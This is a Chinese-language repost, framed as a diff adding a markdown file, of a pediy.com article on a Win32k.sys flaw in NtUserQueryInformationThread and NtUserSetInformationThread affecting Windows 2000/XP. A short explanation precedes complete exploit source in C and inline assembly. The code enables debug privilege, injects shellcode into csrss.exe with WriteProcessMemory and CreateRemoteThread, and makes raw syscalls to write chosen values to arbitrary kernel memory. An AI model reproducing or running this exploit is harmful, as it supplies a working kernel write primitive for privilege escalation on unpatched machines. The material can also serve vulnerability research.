@@ -1,0 +1,429 @@
+
+# CsrssVuln.exe 源代码及分析
+
+> 原文：[`www.pediy.com/kssd/pediy10/85015.html`](https://www.pediy.com/kssd/pediy10/85015.html)
+
+这个漏洞是在 `Win32k.sys` 的代码中的 `NtUserQueryInformationThread` 中存在的
+
+这两个函数从 `WINDOWS 2000` 开始，只判断调用者当前进程是否是 `CSRSS.EXE`，不对传入的参数做验证，导致了漏洞的产生，攻击者只需要使用某种方式进入 `CSRSS` 的进程空间内，就可以触发这种漏洞
+
+这个漏洞在 `Windows 2003,Vista` 被修补了，但 `WINDOWS 2000/XP` 的全补丁版本没有修补
+
+具体我使用的触发方式是使用一个 `InformationClass`: `UserThreadFlags`
+
+这个 `InformationClass` 允许设置一个线程的 `W32Thread->TIF_Flags`，我们可以使用 `NtUserSetInformationThread` 给某个线程设置指定数值的 `TIF_Flags`，再调用 `NtUserQueryInformationThread`，输出 `Buffer` 传入我们想要写入的地址，就可以将指定数值写入指定的内核地址中了
+
+这个 `InformationClass` 实际是传入一个结构 `USERTHREAD_FLAGS`
+
+第一个域是要设置的 `NewFlags`，第二个域是 `dwMask`，需要将 `dwMask` 设为 `0xFFFFFFF`，才能成功写入
+
+其中这个线程必须是 GUI 线程，同时关闭时需要还原 `TIF_Flags`，否则被设置的线程可能出一些问题
+
+下面是源代码：
+
+代码:
+
+
+
+```
+#include "shlwapi.h"
+#include "malloc.h"
+#include "tlhelp32.h"
+
+#pragma  comment(lib , "shlwapi.lib")
+
+
+DWORD
+GetProcessId( LPCTSTR szProcName )
+{
+  PROCESSENTRY32 pe; 
+  DWORD dwPid;
+  DWORD dwRet;
+  BOOL bFound = FALSE;
+
+  HANDLE hSP = CreateToolhelp32Snapshot( TH32CS\_SNAPPROCESS, 0 );
+  if ( hSP )
+  {
+    pe.dwSize = sizeof( pe );
+    
+    for ( dwRet = Process32First( hSP, &pe );
+    dwRet;
+    dwRet = Process32Next( hSP, &pe ) )
+    {
+      if ( StrCmpNI( szProcName, pe.szExeFile, strlen( szProcName ) ) == 0 )
+      {
+        dwPid = pe.th32ProcessID;
+        bFound = TRUE;
+        break;
+      }
+    }
+    
+    CloseHandle( hSP );
+    
+    if ( bFound == TRUE )
+    {
+      return dwPid;
+    }
+  }
+  
+  return NULL;
+}
+BOOL EnableDebugPrivilege()
+{
+  HANDLE hToken;
+  BOOL fOk=FALSE;
+  if(OpenProcessToken(GetCurrentProcess(),TOKEN\_ADJUST\_PRIVILEGES,&hToken))
+  {
+    TOKEN\_PRIVILEGES tp;
+    tp.PrivilegeCount=1;
+    if(!LookupPrivilegeValue(NULL,SE\_DEBUG\_NAME,&tp.Privileges\[0\].Luid))
+      MessageBox(0 , "Can't lookup privilege value.\\n" , 0 , 0);
+    tp.Privileges\[0\].Attributes=SE\_PRIVILEGE\_ENABLED;
+    if(!AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(tp),NULL,NULL))
+      MessageBox(0 , "Can't adjust privilege value.\\n", 0 , 0);
+    fOk=(GetLastError()==ERROR\_SUCCESS);
+    CloseHandle(hToken);
+  }
+    return fOk;
+}
+typedef struct RWK\_MEMORY{
+  ULONG Addr ; 
+  ULONG Value ; 
+  BOOL  bOK ;
+  ULONG ThreadId; 
+}RWK\_MEMORY , \*PRWK\_MEMORY;
+#define \_WIN32\_WINNT 0x400
+//
+// ClientId
+//
+
+typedef struct \_CLIENT\_ID {
+    HANDLE UniqueProcess;
+    HANDLE UniqueThread;
+} CLIENT\_ID;
+typedef CLIENT\_ID \*PCLIENT\_ID;
+typedef struct \_OBJECT\_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    PVOID ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;        // Points to type SECURITY\_DESCRIPTOR
+    PVOID SecurityQualityOfService;  // Points to type SECURITY\_QUALITY\_OF\_SERVICE
+} OBJECT\_ATTRIBUTES;
+typedef OBJECT\_ATTRIBUTES \*POBJECT\_ATTRIBUTES;
+typedef CONST OBJECT\_ATTRIBUTES \*PCOBJECT\_ATTRIBUTES;
+#define InitializeObjectAttributes( p, n, a, r, s ) { \\
+    (p)->Length = sizeof( OBJECT\_ATTRIBUTES );          \\
+    (p)->RootDirectory = r;                             \\
+    (p)->Attributes = a;                                \\
+    (p)->ObjectName = n;                                \\
+    (p)->SecurityDescriptor = s;                        \\
+    (p)->SecurityQualityOfService = NULL;               \\
+    }
+#include "winbase.h"
+void csrssshellthread(PRWK\_MEMORY parm)
+{
+  //set TIF flags 
+  //id of NtUserSetInformationThread = 520 + 4096 (XP)
+  //id of NtUserQueryInformationThread = 479 + 0x1000(XP)
+  //id of NtOpenThread = 128 (XP)
+  CLIENT\_ID ci ; 
+
+  ci.UniqueProcess = 0 ;
+  ci.UniqueThread = (HANDLE)parm->ThreadId ; 
+  OBJECT\_ATTRIBUTES oba ; 
+  InitializeObjectAttributes(&oba , NULL , 0 , 0 , 0 );
+  HANDLE threadhandle = 0;
+  ULONG retlen ; 
+  ULONG info\[2\];
+  //0 = NewFlags
+
+  info\[0\] = parm->Value ; 
+  
+  //1 = FlagsMask
+
+  info\[1\] = 0xFFFFFFFF;
+
+  ULONG oldFlags ;
+  PVOID pInfo = info ; 
+  ULONG addr = parm->Addr  ;
+
+  \_\_asm
+  {
+      
+    lea  eax , ci
+    push  eax
+    lea  eax , oba
+    push  eax
+    push  0x60 
+    //thread query /set information
+    lea    eax , threadhandle
+    push  eax
+    mov     eax , 128
+    //ntopenthread
+    lea    edx ,\[esp\]
+    int     0x2e
+    add    esp , 4\*4
+//    call    openthread
+
+    //call ntopenthread and get My gui thread handle
+
+    test  eax , eax
+    jl    failedx
+    lea    eax ,retlen
+    push  eax
+    push  4
+    lea    eax , oldFlags
+    push  eax
+    push  1
+    //UserThreadFlags
+    push  threadhandle
+    mov     eax , 4575
+    //NtUserQueryInformationThread
+    lea    edx , \[esp\]
+    int    0x2e
+    add    esp , 5\*4
+    test    eax , eax
+    jl    failedx
+    //for save old flags
+
+    //now we set thread flags
+  
+    push  8
+    push  pInfo
+    push  1
+    //UserThreadFlags
+    push  threadhandle
+    mov     eax , 4616
+    //NtUserSetInformationThread
+    lea     edx, \[esp\]
+    int    0x2e
+    add     esp , 4\*4
+    test  eax , eax
+    jl    failedx
+
+    //now our thread flags is set to value
+    //we query thread flags with kernel memory buffer
+    //
+
+    lea    eax ,retlen
+    push  eax
+    push  4
+    push  addr
+    push  1
+    //UserThreadFlags
+    push  threadhandle
+    mov     eax , 4575
+    //NtUserQueryInformationThread
+    lea    edx , \[esp\]
+    int    0x2e
+    add    esp , 5\*4
+    test    eax , eax
+    jl    failedx
+    
+
+    //write success!
+//SET OLD FLAGS
+
+    mov   eax , pInfo
+    mov    ecx , oldFlags
+    mov   dword ptr\[eax\] ,ecx 
+    
+    push  8
+    push  pInfo
+    push  1
+    //UserThreadFlags
+    push  threadhandle
+    mov     eax , 4616
+    //NtUserSetInformationThread
+    lea     edx, \[esp\]
+    int    0x2e
+    add     esp , 4\*4
+    
+    //set OK flag
+    mov   eax , parm
+    mov   dword ptr\[eax + 8 \] , 1
+failedx:
+    mov   eax , threadhandle
+    test  eax , eax
+    jz  noneedclose
+    push  threadhandle
+    mov    eax , 25
+    //NtClose
+    lea    edx ,\[esp\]
+    int    0x2e
+    add    esp , 0x4
+noneedclose:
+
+    
+  }
+
+  return ;   
+}
+void \_\_declspec(naked) nop\_func()
+{
+  \_\_asm{
+    mov edx , edx
+    retn 0
+  }
+}
+void CCsrssVulnDlg::OnOK() 
+{
+  // TODO: Add extra validation here
+
+    EnableDebugPrivilege();
+    ULONG pid = GetProcessId("CSRSS.EXE");
+    if (pid == 0 )
+    {
+      MessageBox("cannot get csrss.exe pid\\n", 0,0);
+      return ;
+    }
+
+    HANDLE hproc = OpenProcess(PROCESS\_ALL\_ACCESS , FALSE , pid);
+
+    if (hproc == 0 )
+    {
+      CHAR msg \[100\];
+      sprintf(msg ,"cannot open csrss! err = %u\\n" , GetLastError() );
+      MessageBox( msg , 0 , 0 );
+      return ;
+    }
+
+    HMODULE hlib = LoadLibrary("ntdll.dll");
+    PVOID pAddrAllocate = GetProcAddress(hlib , "ZwAllocateVirtualMemory");
+    PVOID pAddrFree = GetProcAddress(hlib , "ZwFreeVirtualMemory");
+    if (pAddrFree == 0 ||
+      pAddrAllocate == 0 )
+    {
+      MessageBox("cannot get addr of Zw allocate/free memory routine!\\n", 0 , 0 );
+      CloseHandle(hproc);
+      return  ;
+
+    }
+    ULONG Protect = PAGE\_EXECUTE\_READWRITE;
+    ULONG AllocationType = MEM\_RESERVE | MEM\_COMMIT | MEM\_TOP\_DOWN;
+    ULONG RegionSize = (ULONG)nop\_func - (ULONG)csrssshellthread + sizeof(RWK\_MEMORY);
+    ULONG BaseAddr = 0 ;
+    LONG  retvalue ; 
+    \_\_asm
+    {
+      push  Protect
+      push  AllocationType
+      lea    eax , RegionSize
+      push  eax
+      push  0
+      lea    eax , BaseAddr
+      push  eax
+      push  hproc
+      call  pAddrAllocate
+      mov    retvalue , eax
+    }
+    if (retvalue < 0 )
+    {
+      CHAR msg\[100\];
+      
+      sprintf(msg , "ZwAllocateMemory failed! stat = %08x\\n" , retvalue);
+      MessageBox(msg , 0 , 0 );
+
+      CloseHandle(hproc);
+      return  ;
+    }
+
+    DWORD btw ; 
+    RWK\_MEMORY xxmemory ; 
+    HANDLE hRemoteThread ;
+    ULONG ThreadId;
+    xxmemory.Addr= 0x804d8002 ; 
+    xxmemory.Value = 0x12345678 ;
+    xxmemory.bOK = FALSE ; 
+    xxmemory.ThreadId = GetCurrentThreadId();
+ 
+    PVOID pBuffer = malloc((ULONG)nop\_func - (ULONG)csrssshellthread + sizeof(RWK\_MEMORY));
+    if (pBuffer == 0 )
+    {
+      MessageBox("allocate memory failed \\n", 0 , 0);
+      goto end ; 
+    }
+
+    CopyMemory(pBuffer , (PVOID)csrssshellthread , (ULONG)nop\_func - (ULONG)csrssshellthread);
+    CopyMemory((PVOID)((ULONG)pBuffer + (ULONG)nop\_func - (ULONG)csrssshellthread) ,
+      &xxmemory , 
+      sizeof(RWK\_MEMORY)
+      );
+
+
+    if (!WriteProcessMemory(hproc , 
+      (PVOID)BaseAddr , 
+      pBuffer ,
+      (ULONG)nop\_func - (ULONG)csrssshellthread + sizeof(RWK\_MEMORY) , 
+      &btw))
+    {
+      CHAR msg\[100\];
+      sprintf(msg,"Write process memory failed err = %u\\n" , GetLastError());
+      MessageBox(msg , 0 , 0 );
+      goto end ;  
+    }
+
+    hRemoteThread = CreateRemoteThread(hproc ,
+      NULL ,  
+      0 , 
+      (LPTHREAD\_START\_ROUTINE)BaseAddr , 
+      (PVOID)((ULONG)BaseAddr + (ULONG)nop\_func - (ULONG)csrssshellthread),
+      0,
+      &ThreadId);
+
+
+    if (hRemoteThread == 0 )
+    {
+      CHAR msg\[100\];
+      sprintf(msg , "cannot create remote thread in csrss! err = %u\\n" , GetLastError());
+      MessageBox(msg , 0 , 0);
+      goto end ;
+    }
+
+    WaitForSingleObject(hRemoteThread , INFINITE);
+
+
+
+    if (!ReadProcessMemory(hproc ,
+      (PVOID)((ULONG)BaseAddr + (ULONG)nop\_func - (ULONG)csrssshellthread),
+      &xxmemory , 
+      sizeof(xxmemory) , 
+      &btw))
+    {
+      MessageBox("shell code inject OK but cannot get status !\\n" , 0 , 0 );
+      goto end ; 
+    }
+
+
+    if (xxmemory.bOK == FALSE)
+    {
+      
+      MessageBox("Write Kernel Memory failed!\\n", 0 , 0);
+    }
+    else
+    {
+      MessageBox("Write Kernel Memory OK!\\n", 0 , 0);
+    }
+    
+end:
+    ULONG freeType = MEM\_DECOMMIT;
+    RegionSize = (ULONG)nop\_func - (ULONG)csrssshellthread + sizeof(RWK\_MEMORY);
+    \_\_asm
+    {
+      push  freeType
+      lea    eax,RegionSize
+      push  eax
+      push  BaseAddr
+      push  hproc
+      call  pAddrFree
+    }
+    CloseHandle(hproc);
+    if (pBuffer)
+      free(pBuffer);
+
+    return  ;
+  
+}
+
+```
